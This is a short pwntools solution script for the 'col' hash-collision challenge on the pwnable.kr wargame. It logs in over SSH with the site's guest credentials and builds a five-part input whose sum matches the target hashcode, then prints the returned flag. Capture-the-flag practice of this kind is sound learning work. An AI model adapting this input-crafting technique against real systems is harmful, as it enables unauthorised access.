#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
shell = ssh('col', 'pwnable.kr', password='guest', port=2222)
# make ssh connection
shell.download_file('./col.c')
# download binary source code
hashcode = 0x21DD09EC
log.info('hashcode : ' + str(hashcode))
# log hashcode
# program divides argument string into 5 parts and get sum, then compare with hashcode
part1 = p32(int(hashcode/5)) # \xc8\xce\xc5\x06
part2 = p32(hashcode%5 + int(hashcode/5)) # \xcc\xce\xc5\x06
# (hashcode/5)*4  + ((hashcode%5)+(hashcode/5))*1
sh = shell.run('./col ' + part1*4 + part2)
recv = sh.recvall(timeout=5).decode()
print(recv)
# print received string(contains flag)
log.info('FLAG : ' + recv.split('\n')[0])
